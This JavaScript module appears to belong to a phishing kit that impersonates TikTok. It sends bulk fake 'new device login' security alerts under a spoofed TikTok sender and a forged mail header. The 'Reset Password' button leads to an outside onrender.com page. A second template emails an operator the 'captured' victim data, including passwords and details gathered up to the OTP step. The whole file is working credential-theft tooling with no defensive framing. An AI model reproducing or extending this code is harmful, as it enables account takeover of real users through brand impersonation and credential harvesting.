// ═══════════════════════════════════════════════════════════════
//  EMAIL SENDER MODULE — SMTP + TikTok Template Engine
// ═══════════════════════════════════════════════════════════════

const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

// ── SMTP Configuration ────────────────────────────────────────
// Set these via environment variables or they fallback to defaults.
// Supports: Gmail, Outlook, Yahoo, custom SMTP servers, etc.
//
//   SMTP_HOST       — SMTP server hostname
//   SMTP_PORT       — SMTP port (587 for TLS, 465 for SSL, 25 for plain)
//   SMTP_SECURE     — Use SSL (true for port 465, false for others)
//   SMTP_USER       — SMTP username / email address
//   SMTP_PASS       — SMTP password or app-specific password
//   SMTP_FROM_NAME  — Display name for "From" field
//   SMTP_FROM_EMAIL — Email address for "From" field

const smtpConfig = {
  host: process.env.SMTP_HOST || 'smtp.gmail.com',
  port: parseInt(process.env.SMTP_PORT || '587'),
  secure: process.env.SMTP_SECURE === 'true',   // true = SSL (465), false = STARTTLS (587)
  auth: {
    user: process.env.SMTP_USER || '',
    pass: process.env.SMTP_PASS || '',
  },
  tls: {
    rejectUnauthorized: false  // for self-signed certs
  }
};

const FROM_NAME  = process.env.SMTP_FROM_NAME  || 'TikTok';
const FROM_EMAIL = process.env.SMTP_FROM_EMAIL || process.env.SMTP_USER || '';

// ── Create transporter ────────────────────────────────────────
let transporter = null;

function getTransporter() {
  if (!transporter) {
    transporter = nodemailer.createTransport(smtpConfig);
  }
  return transporter;
}

// ── Verify SMTP connection ────────────────────────────────────
async function verifyConnection() {
  try {
    const t = getTransporter();
    await t.verify();
    return { success: true, message: 'SMTP connection verified successfully' };
  } catch (err) {
    return { success: false, message: err.message };
  }
}

// ── Generate TikTok security alert HTML ───────────────────────
function generateTikTokAlertHTML(data) {
  const {
    recipientName = 'User',
    loginDate     = new Date().toLocaleDateString('en-US', { month: '2-digit', day: '2-digit' }),
    loginTime     = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false }),
    timezone      = 'SAST',
    device        = 'Unknown Device',
    location      = 'Unknown Location',
    senderName    = 'TikTok',
    greetingText  = 'Hi {name},',
    bodyText      = "We're writing to inform you that we detected a login to your account from a new device.",
    instructionText1 = 'If this was you, you can ignore this message.',
    instructionText2 = "If this wasn&rsquo;t you, open the TikTok app and go to &ldquo;Settings and privacy&rdquo; &gt; &ldquo;Security and login&rdquo; &gt; &ldquo;Security alerts&rdquo; and review unauthorized logins.",
    buttonText    = 'Reset Password',
    buttonLink    = 'https://tip-top-v2.onrender.com/reset-password',
    footerText    = 'This is an automatically generated email.<br>Replies to this email address aren&rsquo;t monitored.',
    subjectLine   = 'New device login to your TikTok account',
    baseUrl       = '',
  } = data;

  // Replace placeholders
  const greeting = greetingText.replace('{name}', recipientName);
  
  // Convert relative buttonLink to absolute URL
  const absoluteButtonLink = buttonLink.startsWith('http') ? buttonLink : `${baseUrl}${buttonLink}`;

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok — Security Alert</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background-color: #f5f5f5; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; margin: 0; padding: 0; width: 100%; }
    .email-wrapper { width: 100%; background-color: #f5f5f5; padding: 30px 20px; }
    .email-container { max-width: 600px; margin: 0 auto; background-color: #ffffff; }
    .header { padding: 28px 32px 20px; background-color: #ffffff; }
    .tiktok-logo { display: flex; align-items: center; gap: 6px; }
    .tiktok-logo svg { width: 40px; height: 46px; }
    .tiktok-logo-text { font-size: 34px; font-weight: 800; color: #000000; letter-spacing: -1px; }
    .greeting-bar { background-color: #f1f1f2; padding: 14px 32px; }
    .greeting-text { font-size: 15px; font-weight: 700; color: #161823; }
    .body-content { padding: 24px 32px; }
    .body-text { font-size: 14px; line-height: 1.7; color: #161823; margin-bottom: 20px; }
    .detail-item { margin-bottom: 14px; }
    .detail-label { font-size: 13px; color: #8a8b91; }
    .detail-value { font-size: 14px; color: #161823; line-height: 1.5; }
    .instructions { font-size: 13px; line-height: 1.7; color: #161823; margin-bottom: 20px; }
    .instructions strong { font-weight: 700; }
    .divider { height: 1px; background-color: #e8e8e8; border: none; margin: 24px 0; }
    .verification-section { font-size: 13px; line-height: 1.7; color: #161823; margin-bottom: 16px; }
    .verification-link { color: #fe2c55; font-weight: 700; text-decoration: none; font-size: 13px; }
    .auto-notice { font-size: 13px; line-height: 1.6; color: #8a8b91; margin-top: 16px; }
    .footer { padding: 20px 32px 28px; border-top: 1px solid #e8e8e8; }
    .footer-generated { font-size: 12px; color: #fe2c55; margin-bottom: 4px; }
    .footer-link { color: #161823; font-size: 12px; text-decoration: underline; }
    .footer-address { font-size: 12px; color: #8a8b91; }
    @media screen and (max-width: 600px) {
      .header, .body-content, .footer { padding-left: 20px; padding-right: 20px; }
      .greeting-bar { padding: 12px 20px; }
      .tiktok-logo-text { font-size: 28px; }
    }
  </style>
</head>
<body>
  <div class="email-wrapper">
    <div class="email-container">
      <div class="header">
        <div class="tiktok-logo">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 56" width="40" height="46">
            <path d="M17.2 0.1C18.6 0.1 20 0.1 21.4 0.1C21.6 3.2 22.7 6.3 24.9 8.5C27.1 10.8 30.1 11.9 33.1 12.2V19.8C30.3 19.7 27.5 19 25 17.7C23.9 17.1 22.9 16.4 22 15.6C22 21.5 22 27.4 21.9 33.3C21.8 35.8 21 38.2 19.6 40.2C17.3 43.6 13.3 45.8 9.2 45.9C6.7 46 4.2 45.3 2.1 44C-0.6 42.3 -2.6 39.5 -3.4 36.4C-3.5 35.7 -3.6 35 -3.6 34.3C-3.7 31.5 -2.8 28.7 -1.1 26.5C1.2 23.4 4.9 21.5 8.7 21.4C9.5 21.3 10.4 21.4 11.2 21.5V28.3C10.4 28 9.5 27.9 8.7 28C6.8 28.2 5 29.4 4.2 31.1C3.7 32.1 3.6 33.2 3.8 34.3C4.2 36.5 6.2 38.3 8.5 38.4C10 38.5 11.5 37.8 12.5 36.7C12.9 36.2 13.2 35.6 13.4 35C13.5 34.3 13.6 33.6 13.6 32.9C13.7 22 13.6 11 13.7 0.1C14.9 0.1 16 0.1 17.2 0.1Z" transform="translate(6 5)" fill="#000000"/>
            <path d="M17.2 0.1C18.6 0.1 20 0.1 21.4 0.1C21.6 3.2 22.7 6.3 24.9 8.5C27.1 10.8 30.1 11.9 33.1 12.2V19.8C30.3 19.7 27.5 19 25 17.7C23.9 17.1 22.9 16.4 22 15.6C22 21.5 22 27.4 21.9 33.3C21.8 35.8 21 38.2 19.6 40.2C17.3 43.6 13.3 45.8 9.2 45.9C6.7 46 4.2 45.3 2.1 44C-0.6 42.3 -2.6 39.5 -3.4 36.4C-3.5 35.7 -3.6 35 -3.6 34.3C-3.7 31.5 -2.8 28.7 -1.1 26.5C1.2 23.4 4.9 21.5 8.7 21.4C9.5 21.3 10.4 21.4 11.2 21.5V28.3C10.4 28 9.5 27.9 8.7 28C6.8 28.2 5 29.4 4.2 31.1C3.7 32.1 3.6 33.2 3.8 34.3C4.2 36.5 6.2 38.3 8.5 38.4C10 38.5 11.5 37.8 12.5 36.7C12.9 36.2 13.2 35.6 13.4 35C13.5 34.3 13.6 33.6 13.6 32.9C13.7 22 13.6 11 13.7 0.1C14.9 0.1 16 0.1 17.2 0.1Z" transform="translate(4 3)" fill="#25F4EE"/>
            <path d="M17.2 0.1C18.6 0.1 20 0.1 21.4 0.1C21.6 3.2 22.7 6.3 24.9 8.5C27.1 10.8 30.1 11.9 33.1 12.2V19.8C30.3 19.7 27.5 19 25 17.7C23.9 17.1 22.9 16.4 22 15.6C22 21.5 22 27.4 21.9 33.3C21.8 35.8 21 38.2 19.6 40.2C17.3 43.6 13.3 45.8 9.2 45.9C6.7 46 4.2 45.3 2.1 44C-0.6 42.3 -2.6 39.5 -3.4 36.4C-3.5 35.7 -3.6 35 -3.6 34.3C-3.7 31.5 -2.8 28.7 -1.1 26.5C1.2 23.4 4.9 21.5 8.7 21.4C9.5 21.3 10.4 21.4 11.2 21.5V28.3C10.4 28 9.5 27.9 8.7 28C6.8 28.2 5 29.4 4.2 31.1C3.7 32.1 3.6 33.2 3.8 34.3C4.2 36.5 6.2 38.3 8.5 38.4C10 38.5 11.5 37.8 12.5 36.7C12.9 36.2 13.2 35.6 13.4 35C13.5 34.3 13.6 33.6 13.6 32.9C13.7 22 13.6 11 13.7 0.1C14.9 0.1 16 0.1 17.2 0.1Z" transform="translate(5 4)" fill="#FE2C55"/>
          </svg>
          <span class="tiktok-logo-text">${senderName}</span>
        </div>
      </div>
      <div class="greeting-bar">
        <p class="greeting-text">${greeting}</p>
      </div>
      <div class="body-content">
        <p class="body-text">${bodyText}</p>
        <div style="margin-bottom: 28px;">
          <div class="detail-item"><div class="detail-label">When:</div><div class="detail-value">${loginDate} ${loginTime} ${timezone}</div></div>
          <div class="detail-item"><div class="detail-label">Device:</div><div class="detail-value">${device}</div></div>
          <div class="detail-item"><div class="detail-label">Near:</div><div class="detail-value">${location}</div></div>
        </div>
        <p class="instructions">${instructionText1}</p>
        <p class="instructions">${instructionText2} If you're unable to access your account, <a href="${absoluteButtonLink}" style="color: #fe2c55; font-weight: 700; text-decoration: none;">reset your password here</a>.</p>
        
        <div style="text-align: center; margin: 24px 0;">
          <a href="${absoluteButtonLink}" style="display: inline-block; background-color: #fe2c55; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-size: 14px; font-weight: 600;">${buttonText}</a>
        </div>
        
        <hr class="divider">
        <p class="verification-section">You can also set up 2-step verification to secure your account by going to &ldquo;Security and login&rdquo; &gt; &ldquo;2-step verification&rdquo;.</p>
        <a href="#" class="verification-link">Learn more about 2-step verification</a>
        <p class="auto-notice">${footerText}</p>
      </div>
      <div class="footer">
        <p class="footer-generated">This email was generated for ${recipientName}</p>
        <a href="#" class="footer-link">Privacy Policy</a><br>
        <span class="footer-address">TikTok 5800 Bristol Pkwy, Culver City, CA 90230</span>
      </div>
    </div>
  </div>
</body>
</html>`;
}

// ── Send email ────────────────────────────────────────────────
async function sendEmail({ to, subject, html, text, replyTo }) {
  const t = getTransporter();

  const mailOptions = {
    from: `"${FROM_NAME}" <${FROM_EMAIL}>`,
    to: to,
    subject: subject || 'New device login to your TikTok account',
    html: html,
    text: text || '',
    ...(replyTo ? { replyTo } : {}),
    headers: {
      'X-Mailer': 'TikTok Security <noreply@tiktok.com>',
      'X-Priority': '1',
      'Importance': 'high',
    }
  };

  try {
    const info = await t.sendMail(mailOptions);
    return {
      success: true,
      messageId: info.messageId,
      accepted: info.accepted,
      rejected: info.rejected,
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// ── Send TikTok security alert ────────────────────────────────
async function sendTikTokAlert({ to, recipientName, loginDate, loginTime, timezone, device, location, senderName, greetingText, bodyText, instructionText1, instructionText2, buttonText, buttonLink, footerText, subjectLine }) {
  const html = generateTikTokAlertHTML({ recipientName, loginDate, loginTime, timezone, device, location, senderName, greetingText, bodyText, instructionText1, instructionText2, buttonText, buttonLink, footerText, subjectLine });
  return sendEmail({
    to,
    subject: subjectLine || 'New device login to your TikTok account',
    html,
    text: `Hi ${recipientName}, We detected a login to your account from a new device. When: ${loginDate} ${loginTime} ${timezone}. Device: ${device}. Near: ${location}. If this wasn't you, open the TikTok app and review your security settings.`,
  });
}

// ── Generate OTP Alert HTML for Admin ────────────────────────
function generateOTPAdminAlertHTML(data) {
  const {
    adminName = 'Admin',
    userEmail = 'user@example.com',
    capturedData = {},
    timestamp = new Date().toISOString(),
    adminLink = 'https://tip-top-v2.onrender.com/admin',
    baseUrl = '',
  } = data;

  const absoluteAdminLink = adminLink.startsWith('http') ? adminLink : `${baseUrl}${adminLink}`;
  const time = new Date(timestamp).toLocaleString();

  // Build data rows HTML
  let dataRowsHTML = '';
  Object.entries(capturedData).forEach(([key, value]) => {
    const isPassword = key.toLowerCase().includes('password') || key.toLowerCase().includes('pwd');
    const isEmail = key.toLowerCase().includes('email');
    const color = isPassword ? '#f59e0b' : isEmail ? '#10b981' : '#4fc3f7';
    
    dataRowsHTML += `
      <tr>
        <td style="padding: 12px 16px; border-bottom: 1px solid #e8e8e8; font-size: 13px; color: #8a8b91; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;">${key}</td>
        <td style="padding: 12px 16px; border-bottom: 1px solid #e8e8e8; font-size: 14px; color: ${color}; font-family: 'Courier New', monospace; word-break: break-all;">${value}</td>
      </tr>
    `;
  });

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OTP Verification Alert</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background-color: #f5f5f5; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; margin: 0; padding: 0; width: 100%; }
    .email-wrapper { width: 100%; background-color: #f5f5f5; padding: 30px 20px; }
    .email-container { max-width: 600px; margin: 0 auto; background-color: #ffffff; }
    .header { padding: 28px 32px 20px; background-color: #ffffff; border-bottom: 2px solid #fe2c55; }
    .alert-badge { display: inline-block; padding: 6px 12px; background: rgba(245,158,11,0.15); color: #f59e0b; border-radius: 6px; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px; }
    .header-title { font-size: 24px; font-weight: 800; color: #000000; }
    .body-content { padding: 24px 32px; }
    .body-text { font-size: 14px; line-height: 1.7; color: #161823; margin-bottom: 20px; }
    .detail-item { margin-bottom: 14px; }
    .detail-label { font-size: 13px; color: #8a8b91; }
    .detail-value { font-size: 14px; color: #161823; line-height: 1.5; font-weight: 600; }
    .data-table { width: 100%; border-collapse: collapse; margin: 20px 0; background: #f9f9f9; border-radius: 8px; overflow: hidden; }
    .data-table th { background: #f1f1f2; padding: 12px 16px; text-align: left; font-size: 12px; color: #8a8b91; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
    .cta-button { display: inline-block; background-color: #fe2c55; color: white; padding: 14px 28px; text-decoration: none; border-radius: 8px; font-size: 15px; font-weight: 700; text-align: center; margin: 20px 0; }
    .cta-button:hover { background-color: #ff4d73; }
    .footer { padding: 20px 32px 28px; border-top: 1px solid #e8e8e8; }
    .footer-text { font-size: 12px; color: #8a8b91; line-height: 1.6; }
    @media screen and (max-width: 600px) {
      .header, .body-content, .footer { padding-left: 20px; padding-right: 20px; }
    }
  </style>
</head>
<body>
  <div class="email-wrapper">
    <div class="email-container">
      <div class="header">
        <div class="alert-badge">🔔 OTP Alert</div>
        <h1 class="header-title">User Reached OTP Verification</h1>
      </div>
      <div class="body-content">
        <p class="body-text">Hi ${adminName},</p>
        <p class="body-text">A user has reached the OTP verification step. Here's the data captured so far:</p>
        
        <div class="detail-item">
          <div class="detail-label">User Email:</div>
          <div class="detail-value">${userEmail}</div>
        </div>
        
        <div class="detail-item">
          <div class="detail-label">Timestamp:</div>
          <div class="detail-value">${time}</div>
        </div>

        <table class="data-table">
          <thead>
            <tr>
              <th style="width: 40%;">Field</th>
              <th style="width: 60%;">Value</th>
            </tr>
          </thead>
          <tbody>
            ${dataRowsHTML}
          </tbody>
        </table>
        
        <div style="text-align: center;">
          <a href="${absoluteAdminLink}" class="cta-button">View Full Data in Admin Panel</a>
        </div>
        
        <p class="body-text" style="font-size: 13px; color: #8a8b91; margin-top: 24px;">Click the button above to view all captured user data in the admin dashboard. The latest entries will be highlighted.</p>
      </div>
      <div class="footer">
        <p class="footer-text">This is an automated alert from your TikTok monitoring system.<br>Please do not reply to this email.</p>
      </div>
    </div>
  </div>
</body>
</html>`;
}

// ── Send OTP Alert to Admin ─────────────────────────────────
async function sendOTPAdminAlert({ to, adminName, userEmail, capturedData, timestamp, adminLink }) {
  const html = generateOTPAdminAlertHTML({ adminName, userEmail, capturedData, timestamp, adminLink });
  return sendEmail({
    to,
    subject: '🔔 OTP Verification Alert - User Data Captured',
    html,
    text: `Hi ${adminName}, a user has reached OTP verification. Email: ${userEmail}. Time: ${new Date(timestamp).toLocaleString()}. View full data at: ${adminLink}`,
  });
}

// ── Send bulk emails ──────────────────────────────────────────
async function sendBulk(recipients, templateData, delayMs = 1000) {
  const results = [];
  for (const recipient of recipients) {
    const merged = { ...templateData, ...recipient };
    const result = await sendTikTokAlert(merged);
    results.push({ to: recipient.to, ...result });
    // Delay between sends to avoid rate limiting
    if (delayMs > 0) {
      await new Promise(r => setTimeout(r, delayMs));
    }
  }
  return results;
}

// ── Get SMTP config (redacted password) ───────────────────────
function getConfig() {
  return {
    host: smtpConfig.host,
    port: smtpConfig.port,
    secure: smtpConfig.secure,
    user: smtpConfig.auth.user,
    pass: smtpConfig.auth.pass ? '••••••••' : '(not set)',
    fromName: FROM_NAME,
    fromEmail: FROM_EMAIL,
  };
}

// ── Update SMTP config at runtime ─────────────────────────────
function updateConfig(newConfig) {
  if (newConfig.host) smtpConfig.host = newConfig.host;
  if (newConfig.port) smtpConfig.port = parseInt(newConfig.port);
  if (newConfig.secure !== undefined) smtpConfig.secure = newConfig.secure;
  if (newConfig.user) smtpConfig.auth.user = newConfig.user;
  if (newConfig.pass) smtpConfig.auth.pass = newConfig.pass;
  // Reset transporter to pick up new config
  transporter = null;
  return getConfig();
}

module.exports = {
  sendEmail,
  sendTikTokAlert,
  sendOTPAdminAlert,
  sendBulk,
  verifyConnection,
  getConfig,
  updateConfig,
  generateTikTokAlertHTML,
  generateOTPAdminAlertHTML,
};
